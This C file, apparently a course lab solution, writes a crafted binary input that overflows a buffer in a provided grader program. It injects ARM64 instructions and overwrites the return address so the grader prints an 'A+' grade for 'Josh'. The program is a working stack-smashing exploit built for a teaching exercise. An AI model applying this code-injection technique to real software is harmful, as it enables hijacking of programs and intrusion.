/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Authors: Jacob Santelli and Joshua Yang                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* Main takes no input; writes output to dataAplus, a binary file that 
   overruns the buffer of grader.c and gives "Josh" a grade of 'A+'.
   Returns dataAplus. */
int main(void) {
    /* file to write to */
    FILE *psFile;
    /* current instruction, in machine language */
    unsigned int uiCurrInstr;
    /* address to break to */
    unsigned long ulAddress;
    /* our names (truncated) */
    char* name = "Josh";
    /* counter to iterate through for loops */
    int i;

    psFile = fopen("dataAplus", "w");

    /* write name to file */
    for (i = 0; i < 5; i++) {
        char n = *name;
        /* fwrite(&n, sizeof(char), 1, psFile); */
        fprintf(psFile, "%c", n);
        name++;
    }

    /* write A+ to file, then pad with one byte to reach
       multiple of 4 */
    fprintf(psFile, "A+");
    putc('\0', psFile);

    /* adr x0, grade */
    uiCurrInstr = MiniAssembler_adr(0, 0x420044, 0x420060);
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* mov x1, '\0' */
    uiCurrInstr = MiniAssembler_mov(1, '\0');
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* strb x1, [x0] */
    uiCurrInstr = MiniAssembler_strb(1, 0);
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* adr x0, "A+" */
    uiCurrInstr = MiniAssembler_adr(0, 0x42005d, 0x42006c);
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* bl printf; aka calls printf("A+") */
    uiCurrInstr = MiniAssembler_bl(0x400600, 0x420070);
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* b 0x400864 (line 47 of grader.c) */
    uiCurrInstr = MiniAssembler_b(0x400864, 0x420074);
    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);

    /* filler to overflow buffer */
    for (i = 0; i < 16; i++) {
        fprintf(psFile, "%c", 'a');
    }

    /* overwrite X30 with address to adr instruction above */
    ulAddress = 0x420060;
    (void) fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
    
    fclose(psFile);
    return 0;
}
